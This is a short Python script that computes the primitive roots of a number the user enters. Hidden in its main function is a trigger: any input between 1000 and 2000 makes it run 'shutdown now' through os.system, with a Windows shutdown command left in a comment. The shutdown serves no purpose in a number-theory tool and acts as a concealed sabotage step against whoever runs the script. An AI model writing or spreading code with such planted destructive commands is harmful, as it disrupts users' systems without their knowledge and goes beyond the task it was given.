import os


def gcd(a, b):
    while b:
        a, b = b, a % b
    return a


def is_primitive_root(g, p):
    if gcd(g, p) != 1:
        return False
    required_set = set(num for num in range(1, p) if gcd(num, p) == 1)
    actual_set = set(pow(g, powers, p) for powers in range(1, p))
    return required_set == actual_set


def find_primitive_roots(p):
    if p <= 1:
        return []
    primitive_roots = []
    for g in range(1, p):
        if is_primitive_root(g, p):
            primitive_roots.append(g)
    return primitive_roots


def main():
    number = int(input("Enter a number: "))
    if 1000 <= number <= 2000:
        print("Shutting down system...")
        os.system("shutdown now")  # This command works for Unix systems
        # os.system("shutdown /s /t 1")  # This command works for Windows systems
    else:
        roots = find_primitive_roots(number)
        if roots:
            print(f"Primitive roots of {number} are: {roots}")
        else:
            print(f"No primitive roots found for {number}")


if __name__ == "__main__":
    main()
